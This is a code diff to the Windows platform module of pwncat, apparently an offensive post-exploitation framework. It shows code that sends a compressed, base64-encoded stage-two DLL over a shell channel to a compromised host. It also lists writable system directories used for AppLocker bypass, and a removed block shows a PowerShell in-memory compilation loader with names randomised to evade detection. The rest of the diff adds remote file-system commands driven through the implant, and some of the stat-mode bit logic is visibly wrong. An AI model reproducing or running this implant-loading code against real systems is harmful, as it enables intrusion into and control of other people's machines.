@@ -3,6 +3,7 @@ from io import RawIOBase, TextIOWrapper, BufferedIOBase, UnsupportedOperation
 from typing import List, Union
 from io import StringIO, BytesIO
 from subprocess import CalledProcessError, TimeoutExpired
+from dataclasses import dataclass
 import subprocess
 import textwrap
 import pkg_resources
@@ -10,6 +11,7 @@ import pathlib
 import base64
 import time
 import gzip
+import stat
 import os
 
 import pwncat
@@ -18,6 +20,38 @@ import pwncat.util
 from pwncat.platform import Platform, PlatformError, Path
 
 INTERACTIVE_END_MARKER = b"\nINTERACTIVE_COMPLETE\r\n"
+
+
+@dataclass
+class stat_result:
+    """Python `os` doesn't provide a way to sainly construct a stat_result
+    so I created this."""
+
+    st_mode = 0
+    st_ino = 0
+    st_dev = 0
+    st_nlink = 0
+    st_uid = 0
+    st_gid = 0
+    st_size = 0
+    st_atime = 0
+    st_mtime = 0
+    st_ctime = 0
+    st_atime_ns = 0
+    st_mtime_ns = 0
+    st_ctime_ns = 0
+    st_blocks = 0
+    st_blksize = 0
+    st_rdev = 0
+    st_flags = 0
+    st_gen = 0
+    st_birthtime = 0
+    st_fstype = 0
+    st_rsize = 0
+    st_creator = 0
+    st_type = 0
+    st_file_attributes = 0
+    st_reparse_tag = 0
 
 
 class WindowsFile(RawIOBase):
@@ -320,18 +354,12 @@ class Windows(Platform):
         self._interactive = False
         self.interactive_tracker = 0
 
-        # Ensure history is disabled (this does not help logging!)
-        # self.disable_history()
+        # This is set when bootstrapping stage two
+        self.host_uuid = None
 
         # Most Windows connections aren't capable of a PTY, and checking
         # is difficult this early. We will assume there isn't one.
         self.has_pty = True
-
-        # Trigger allocation of a pty. Because of powershell and windows
-        # being unpredictable and weird, we basically *need* this. So,
-        # we trigger it initially. WinAPI is available everywhere so on
-        # any relatively recent version of windows, this should be fine.
-        # self.get_pty()
 
         self._bootstrap_stage_two()
 
@@ -350,22 +378,22 @@ class Windows(Platform):
         """
 
         possible_dirs = [
-            "C:\\Windows\\Tasks",
-            "C:\\Windows\\Temp",
-            "C:\\windows\\tracing",
-            "C:\\Windows\\Registration\\CRMLog",
-            "C:\\Windows\\System32\\FxsTmp",
-            "C:\\Windows\\System32\\com\\dmp",
-            "C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys",
-            "C:\\Windows\\System32\\spool\\PRINTERS",
-            "C:\\Windows\\System32\\spool\\SERVERS",
-            "C:\\Windows\\System32\\spool\\drivers\\color",
-            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter",
-            "C:\\Windows\\System32\\Tasks_Migrated (after peforming a version upgrade of Windows 10)",
-            "C:\\Windows\\SysWOW64\\FxsTmp",
-            "C:\\Windows\\SysWOW64\\com\\dmp",
-            "C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter",
-            "C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System",
+            "\\Windows\\Tasks",
+            "\\Windows\\Temp",
+            "\\windows\\tracing",
+            "\\Windows\\Registration\\CRMLog",
+            "\\Windows\\System32\\FxsTmp",
+            "\\Windows\\System32\\com\\dmp",
+            "\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys",
+            "\\Windows\\System32\\spool\\PRINTERS",
+            "\\Windows\\System32\\spool\\SERVERS",
+            "\\Windows\\System32\\spool\\drivers\\color",
+            "\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter",
+            "\\Windows\\System32\\Tasks_Migrated (after peforming a version upgrade of Windows 10)",
+            "\\Windows\\SysWOW64\\FxsTmp",
+            "\\Windows\\SysWOW64\\com\\dmp",
+            "\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter",
+            "\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System",
         ]
         chunk_sz = 1900
 
@@ -426,7 +454,7 @@ class Windows(Platform):
 
         # Search for all instances of InstallUtil within all installed .Net versions
         self.channel.send(
-            """cmd /c "dir C:\Windows\Microsoft.NET\* /s/b | findstr InstallUtil.exe$"\n""".encode(
+            """cmd /c "dir \Windows\Microsoft.NET\* /s/b | findstr InstallUtil.exe$"\n""".encode(
                 "utf-8"
             )
         )
@@ -456,7 +484,7 @@ class Windows(Platform):
         self.channel.recvuntil(b"READY")
         self.channel.recvuntil(b"\n")
 
-        # Send stagetwo
+        # Load, Compress and Encode stage two
         with open(
             pkg_resources.resource_filename("pwncat", "data/stagetwo.dll"), "rb"
         ) as filp:
@@ -466,112 +494,18 @@ class Windows(Platform):
                 gz.write(stagetwo_dll)
             encoded = base64.b64encode(compressed.getvalue())
 
-        # for i in range(0, len(encoded), 128):
-        #     self.channel.sendline(encoded[i : i + 128])
-        #     self.session.manager.log(self.channel.recvline().strip().decode("utf-8"))
-        # self.channel.sendline(b"")
-
-        # self.session.manager.log(self.channel.recvline().strip().decode("utf-8"))
-
+        # Send stage two
         self.channel.sendline(encoded)
+
+        # Wait for stage two to be loaded
         self.channel.recvuntil(b"READY")
         self.channel.recvuntil(b"\n")
 
-        return
-
-        # Read stage two source code
-        stage_two_path = pkg_resources.resource_filename("pwncat", "data/loader.dll")
-        with open(stage_two_path, "rb") as filp:
-            source = filp.read()
-
-        # Randomize class and method name for a smidge of anonymity
-        clazz = pwncat.util.random_string(8)
-        main = pwncat.util.random_string(8)
-        source = source.replace(b"class StageTwo", b"class " + clazz.encode("utf-8"))
-        source = source.replace(
-            b"public void main", b"public void " + main.encode("utf-8")
-        )
-
-        # compress and encode source
-        source_gz = BytesIO()
-        with gzip.GzipFile(fileobj=source_gz, mode="wb") as gz:
-            gz.write(source)
-        source_enc = base64.b64encode(source_gz.getvalue())
-
-        # List of needed assemblies for stage two
-        needed_assemblies = [
-            "System.dll",
-            "System.Core.dll",
-            "System.Dynamic.dll",
-            "Microsoft.CSharp.dll",
-        ]
-
-        # List of commands in the payload to bootstrap stage two
-        payload = [
-            "$cp = New-Object System.CodeDom.Compiler.CompilerParameters",
-        ]
-
-        # Add all needed assemblies to the compiler parameters
-        for assembly in needed_assemblies:
-            payload.append(f"""$cp.ReferencedAssemblies.Add("{assembly}")""")
-
-        # Compile our C2 code and execute it
-        payload.extend(
-            [
-                "$cp.GenerateExecutable = $false",
-                "$cp.GenerateInMemory = $true",
-                "$gzb = [System.Convert]::FromBase64String((Read-Host))",
-                "$gzms = New-Object System.IO.MemoryStream -ArgumentList @(,$gzb)",
-                "$gz = New-Object System.IO.Compression.GzipStream $gzms, ([IO.Compression.CompressionMode]::Decompress)",
-                f"$source = New-Object byte[]({len(source)})",
-                f"$gz.Read($source, 0, {len(source)})",
-                "$gz.Close()",
-                "$r = (New-Object Microsoft.CSharp.CSharpCodeProvider).CompileAssemblyFromSource($cp, [System.Text.Encoding]::ASCII.GetString($source))",
-                f"""$r.CompiledAssembly.CreateInstance("{clazz}").{main}()""",
-            ]
-        )
-
-        # Send the payload, then send the encoded and compressed code
-        self.channel.send((";".join(payload)).encode("utf-8") + b"\n")
-        self.channel.send(source_enc + b"\n")
-
-        # Wait for the new C2 to be ready
-        self.channel.recvuntil(b"READY")
-        self.channel.recvuntil(b"\n")
+        # Read host-specific GUID
+        self.host_uuid = self.channel.recvline().strip().decode("utf-8")
 
     def get_pty(self):
         """ We don't need to do this for windows """
-
-    def _load_library(self, name: str, methods: List[str]):
-        """Load the library. This adds a global with the same name as `name`
-        which contains a reference to the library with all methods specified in
-        `mehods` loaded."""
-
-        name = name.encode("utf-8")
-        method_def = b""
-
-        for method in methods:
-            method = method.encode("utf-8")
-            # self.channel.send(
-            method_def += (
-                b'[DllImport(`"'
-                + name
-                + b'.dll`", SetLastError = true)]`npublic static extern '
-                + method
-                + b";`n"
-            )
-
-        command = (
-            b"$"
-            + name
-            + b' = Add-Type -MemberDefinition "'
-            + method_def
-            + b"\" -Name '"
-            + name
-            + b"' -Namespace 'Win32' -PassThru\n"
-        )
-        self.channel.send(command)
-        self.session.manager.log(command.decode("utf-8").strip())
 
     def Popen(
         self,
@@ -645,7 +579,11 @@ class Windows(Platform):
         )
 
     def get_host_hash(self):
-        return "windows-testing"
+        """
+        Unique host identifier for this target. It is taken from the unique
+        cryptographic GUID stored in the windows registry at install.
+        """
+        return self.host_uuid
 
     @property
     def interactive(self):
@@ -730,3 +668,204 @@ class Windows(Platform):
             )
 
         return stream
+
+    def _do_which(self):
+        """ Stub method """
+
+    def abspath(self, path: str) -> str:
+        """ Convert the given relative path to absolute """
+
+        self.channel.sendline(b"abspath")
+        self.channel.sendline(path.encode("utf-8"))
+
+        result = self.channel.recvline().strip().decode("utf-8")
+        if result.startswith("E:S2:EXCEPTION"):
+            raise FileNotFoundError(result)
+
+        return result
+
+    def chdir(self, path: str):
+        """ Change the current working directory """
+
+        self.channel.sendline(b"chdir")
+        self.channel.sendline(path.encode("utf-8"))
+
+        result = self.channel.recvline().strip().decode("utf-8")
+        if result != "S" and "permission" in result.lower():
+            raise PermissionError(result)
+        elif result != "S":
+            raise FileNotFoundError(result)
+
+        old_cwd = self.cwd
+        self.cwd = path
+
+        return old_cwd
+
+    def chmod(self, path: str, mode: int):
+        """ This method is not valid for windows targets. """
+
+        raise NotImplementedError(f"chmod is not valid for {self.name} targets")
+
+    def getenv(self, name: str) -> str:
+        """ Stub method """
+
+        self.channel.sendline(b"getenv")
+        self.channel.sendline(name.encode("utf-8"))
+
+        value = ""
+
+        while True:
+            line = self.channel.recvline().decode("utf-8")
+            if line.rstrip("\r\n") == "S":
+                break
+            if line.startswith("E:S2:EXCEPTION"):
+                raise KeyError(line)
+            value += line
+
+        return value.rstrip("\r\n")
+
+    def link_to(self):
+        """ Stub method """
+
+    def listdir(self, path: str):
+        """ Stub method """
+
+        self.channel.sendline(b"listdir")
+        self.channel.sendline(path.encode("utf-8"))
+
+        entries = []
+        while True:
+            line = self.channel.recvline().rstrip(b"\r\n").decode("utf-8")
+            if line == "S":
+                break
+            if line.startswith("E:S2:EXCEPTION"):
+                raise FileNotFoundError(line)
+            entries.append(line)
+
+        return entries
+
+    def lstat(self):
+        """ Stub method """
+
+    def mkdir(self, path: str):
+        """ Stub method """
+
+        self.channel.sendline(b"mkdir")
+        self.channel.sendline(path.encode("utf-8"))
+
+        result = self.channel.recvline().rstrip("\r\n")
+        if result != "S":
+            raise FileNotFoundError(result)
+
+    def readlink(self):
+        """ Stub method """
+
+    def reload_users(self):
+        """ Stub method """
+
+    def rename(self, src: str, dst: str):
+        """ Stub method """
+
+        self.channel.sendline(b"rename")
+        self.channel.sendline(src.encode("utf-8"))
+        self.channel.sendline(dst.encode("utf-8"))
+
+        result = self.channel.recvline().rstrip("\r\n")
+        if result != "S":
+            raise FileNotFoundError(result)
+
+    def rmdir(self, path: str, recurse: bool):
+        """ Stub method """
+
+        self.channel.sendline(b"rmdir")
+        self.channel.sendline(path.encode("utf-8"))
+        self.channel.sendline(str(recurse).encode("utf-8"))
+
+        result = self.channel.recvline().rstrip("\r\n")
+        if result != "S":
+            raise FileNotFoundError(result)
+
+    def stat(self, path: str):
+        """ Stub method """
+
+        self.channel.sendline(b"stat")
+        self.channel.sendline(path.encode("utf-8"))
+
+        result = stat_result()
+
+        attrs = self.channel.recvline().rstrip(b"\r\n").decode("utf-8")
+        if attrs.startswith("E:"):
+            raise FileNotFoundError(attrs)
+        attrs = int(attrs)
+
+        result.st_ctime_ns = (
+            int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8")) * 100
+        )
+        result.st_atime_ns = (
+            int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8")) * 100
+        )
+        result.st_mtime_ns = (
+            int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8")) * 100
+        )
+        result.st_dev = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
+        size_hi = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
+        size_lo = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
+        result.st_size = (size_hi << 32) | (size_lo)
+        result.st_nlink = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
+        ino_hi = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
+        ino_lo = int(self.channel.recvline().rstrip(b"\r\n").decode("utf-8"))
+        result.st_ino = (ino_hi << 32) | (ino_lo)
+
+        result.st_ctime = result.st_ctime_ns / 1000000000.0
+        result.st_atime = result.st_atime_ns / 1000000000.0
+        result.st_mtime = result.st_mtime_ns / 1000000000.0
+
+        result.st_file_attributes = attrs
+        result.st_reparse_point = 0
+
+        if result.st_file_attributes & stat.FILE_ATTRIBUTE_READONLY:
+            result.st_mode |= stat.S_IREAD
+        else:
+            result.st_mode |= stat.S_IREAD | stat.S_IWRITE
+
+        if result.st_file_attributes & stat.FILE_ATTRIBUTE_DEVICE:
+            result.st_mode |= stat.S_IFBLK
+        if result.st_file_attributes & stat.FILE_ATTRIBUTE_DEVICE:
+            result.st_mode |= stat.S_IFDIR
+        if result.st_file_attributes & stat.FILE_ATTRIBUTE_DEVICE:
+            result.st_mode |= stat.S_IFREG
+
+        return result
+
+    def symlink_to(self):
+        """ Stub method """
+
+    def tempfile(self):
+        """ Stub method """
+
+    def touch(self, path: str):
+        """ Stub method """
+
+    def umask(self):
+        """ Stub method """
+
+    def unlink(self, path: str):
+        """ Stub method """
+
+        self.channel.sendline(b"unlink")
+        self.channel.sendline(path.encode("utf-8"))
+
+        result = self.channel.recvline().rstrip("\r\n")
+        if result != "S":
+            raise FileNotFoundError(result)
+
+    def whoami(self) -> str:
+        """ Stub method """
+
+        self.channel.sendline(b"whoami")
+
+        result = self.channel.recvline().rstrip("\r\n")
+        if result.startswith("E:S2:EXCEPTION"):
+            raise OSError(result)
+
+        return result
